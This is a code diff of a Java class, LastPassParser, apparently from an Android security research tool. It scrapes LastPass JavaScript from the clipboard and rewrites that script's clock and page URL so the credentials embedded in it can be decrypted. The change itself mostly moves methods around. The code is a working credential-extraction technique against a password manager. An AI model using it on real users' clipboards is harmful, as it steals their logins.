@@ -65,8 +65,8 @@ public class LastPassParser implements ClipParser {
      * The regex/Pattern for a call to 'atob', used by the LastPass JavaScript program to
      * convert the user credentials from Base64
      */
-    public static String REGEX = "atob\\(\\'([^']*)\\'\\)";
-    public static Pattern PATTERN = Pattern.compile(REGEX);
+    private static String REGEX = "atob\\(\\'([^']*)\\'\\)";
+    private static Pattern PATTERN = Pattern.compile(REGEX);
 
 
     /**
@@ -87,6 +87,11 @@ public class LastPassParser implements ClipParser {
     final static String
             VAR_INJECTED_URL = "com_actisec_clipcaster_injectedurl";
 
+    @Override
+    public void onClip(Context context, ScrapedDataHandler handler, String contents) {
+        Parser parser = new Parser(context, handler, System.currentTimeMillis());
+        parser.getData(contents);
+    }
 
     static String[] getUrlsToTry(Context context){
         return context.getResources().getStringArray(R.array.login_urls);
@@ -110,11 +115,107 @@ public class LastPassParser implements ClipParser {
         return ofLength.toArray(new String[ofLength.size()]);
     }
 
+    /**
+     * Returns JavaScript that declares a variable containing 'url'. The variables name is taken from
+     * {@link #VAR_INJECTED_URL}
+     * Converts it to Base64 to avoid parse errors
+     * @param url The url to be injected
+     * @return The declaration of the variable
+     */
+    static String createInjectedUrl(String url){
+        return "var " + VAR_INJECTED_URL + "= atob('" + Base64.encodeToString(url.getBytes(),Base64.NO_WRAP) + "');";
+    }
 
-    @Override
-    public void onClip(Context context, ScrapedDataHandler handler, String contents) {
-        Parser parser = new Parser(context, handler, System.currentTimeMillis());
-        parser.getData(contents);
+    /**
+     * Returns JavaScript that calls a function with the given arguments
+     * @param funcName The function to call
+     * @param args The arguments
+     * @return JavaScript calling 'funcName' with 'args'
+     */
+    static String createCall(String funcName, String[] args){
+        String result = funcName + "(";
+        for (int i = 0; i < args.length; i++) {
+            String arg = args[i];
+            result += arg;
+            if(i != args.length - 1){
+                result += ',';
+            }
+        }
+        return result + ")";
+    }
+
+
+    /**
+     * Given a LastPass JavaScript program and the approximate time it was created, returns
+     * a modified subset of the program.
+     *
+     * When this is done, the function {@link #FUNC_DECRYPT} can be called with the arguments passed
+     * in the original program.
+     *
+     * The modified script will use {@code time} (rather than the current time) and an
+     * undeclared variable with name {@link #VAR_INJECTED_URL} (rather than the current document's
+     * url) to decrypt the arguments
+     *
+     * @param program The LastPass JavaScript program to modify
+     * @param time The approximate unix time the program was created. Must be less than 10 seconds after
+     *             the actual time
+     * @return The modified program
+     */
+    static String createDecryptProgram(JavaScript program, long time){
+        String decryptFunc = instrumentDecryptFunctionWithLocation(program,VAR_INJECTED_URL);
+        String getTimeFunc = instrumentTimeFunction(program, time);
+        String shaFunc = program.getFunction(FUNC_DOSHA);
+        return getTimeFunc + ';' + shaFunc + ';' + decryptFunc + ';';
+    }
+
+
+    /**
+     * Replaces the 'Date.getTime()' function to always return a given time, essentially tricking
+     * the rest of the script into thinking it's always running at that time
+     * @param program The program to instrument
+     * @param time The approximate unix time the program was created. Must be less than 10 seconds
+     *             after the actual time
+     * @return The instrumented time function. When {@link #FUNC_GETTIME} is called, it will always
+     *          return {@code time}
+     */
+    static String instrumentTimeFunction(JavaScript program, long time){
+        final String
+                CLOCK_OVERRIDE= "Date.prototype.getTime = function(){return " + time + "; };";
+        return CLOCK_OVERRIDE + program.getFunction(FUNC_GETTIME);
+
+    }
+
+    /**
+     * Replaces the 'document.location.href' accessor in {@link #FUNC_DECRYPT} with a given String
+     * @param program The program to instrument. Must contain a function {@link #FUNC_DECRYPT}
+     * @param location The text to replace 'document.location.href'
+     * @return The {@link #FUNC_DECRYPT} function, modified to use {@code location} rather than
+     *          'document.location.href'
+     */
+    static String instrumentDecryptFunctionWithLocation(JavaScript program, String location){
+        return program.getFunction(FUNC_DECRYPT).replace("document.location.href",location);
+    }
+
+
+    /**
+     * Checks to see if it is a username/password rather than random bits.
+     *
+     * 100% Sensitivity (All valid usernames/passwords are identified)
+     * <100% Specificity (Some invalid usernames/password are also identified)
+     *
+     * Assumes ASCII compatible encoding.
+     *
+     * @param toCheck The String to check
+     * @return true if it does not contain control characters, false otherwise
+     */
+    public static boolean sCheckString(String toCheck) {
+        char[] array = toCheck.toCharArray();
+        for (char c : array) {
+            if (c < 33 || c > 126) {
+                return false;
+            }
+        }
+        return true;
     }
 
     /**
@@ -270,105 +371,4 @@ public class LastPassParser implements ClipParser {
             }
         }
     }
-
-
-    /**
-     * Returns JavaScript that declares a variable containing 'url'. The variables name is taken from
-     * {@link #VAR_INJECTED_URL}
-     * Converts it to Base64 to avoid parse errors
-     * @param url The url to be injected
-     * @return The declaration of the variable
-     */
-    static String createInjectedUrl(String url){
-        return "var " + VAR_INJECTED_URL + "= atob('" + Base64.encodeToString(url.getBytes(),Base64.NO_WRAP) + "');";
-    }
-
-    /**
-     * Returns JavaScript that calls a function with the given arguments
-     * @param funcName The function to call
-     * @param args The arguments
-     * @return JavaScript calling 'funcName' with 'args'
-     */
-    static String createCall(String funcName, String[] args){
-        String result = funcName + "(";
-        for (int i = 0; i < args.length; i++) {
-            String arg = args[i];
-            result += arg;
-            if(i != args.length - 1){
-                result += ',';
-            }
-        }
-        return result + ")";
-    }
-
-
-    /**
-     * Given a LastPass JavaScript program and the approximate time it was created, returns
-     * a modified subset of the program.
-     *
-     * When this is done, the function {@link #FUNC_DECRYPT} can be called with the arguments passed
-     * in the original program.
-     *
-     * The modified script will use {@code time} (rather than the current time) and an
-     * undeclared variable with name {@link #VAR_INJECTED_URL} (rather than the current document's
-     * url) to decrypt the arguments
-     *
-     * @param program The LastPass JavaScript program to modify
-     * @param time The approximate unix time the program was created. Must be less than 10 seconds after
-     *             the actual time
-     * @return The modified program
-     */
-    static String createDecryptProgram(JavaScript program, long time){
-        String decryptFunc = instrumentDecryptFunctionWithLocation(program,VAR_INJECTED_URL);
-        String getTimeFunc = instrumentTimeFunction(program, time);
-        String shaFunc = program.getFunction(FUNC_DOSHA);
-        return getTimeFunc + ';' + shaFunc + ';' + decryptFunc + ';';
-    }
-
-
-    /**
-     * Replaces the 'Date.getTime()' function to always return a given time, essentially tricking
-     * the rest of the script into thinking it's always running at that time
-     * @param program The program to instrument
-     * @param time The approximate unix time the program was created. Must be less than 10 seconds
-     *             after the actual time
-     * @return The instrumented time function. When {@link #FUNC_GETTIME} is called, it will always
-     *          return {@code time}
-     */
-    static String instrumentTimeFunction(JavaScript program, long time){
-        final String
-                CLOCK_OVERRIDE= "Date.prototype.getTime = function(){return " + time + "; };";
-        return CLOCK_OVERRIDE + program.getFunction(FUNC_GETTIME);
-
-    }
-
-    /**
-     * Replaces the 'document.location.href' accessor in {@link #FUNC_DECRYPT} with a given String
-     * @param program The program to instrument. Must contain a function {@link #FUNC_DECRYPT}
-     * @param location The text to replace 'document.location.href'
-     * @return The {@link #FUNC_DECRYPT} function, modified to use {@code location} rather than
-     *          'document.location.href'
-     */
-    static String instrumentDecryptFunctionWithLocation(JavaScript program, String location){
-        return program.getFunction(FUNC_DECRYPT).replace("document.location.href",location);
-    }
-
-
-    /**
-     * Checks to see if it is a garbage string. Works only for ASCII type
-     * encodings
-     * @param toCheck The String to check
-     * @return true if it does not contain control characters, false otherwise
-     */
-    public static boolean sCheckString(String toCheck) {
-        char[] array = toCheck.toCharArray();
-        for (char c : array) {
-            if (c < 33 || c > 126) {
-                return false;
-            }
-        }
-        return true;
-    }
-
-
 }
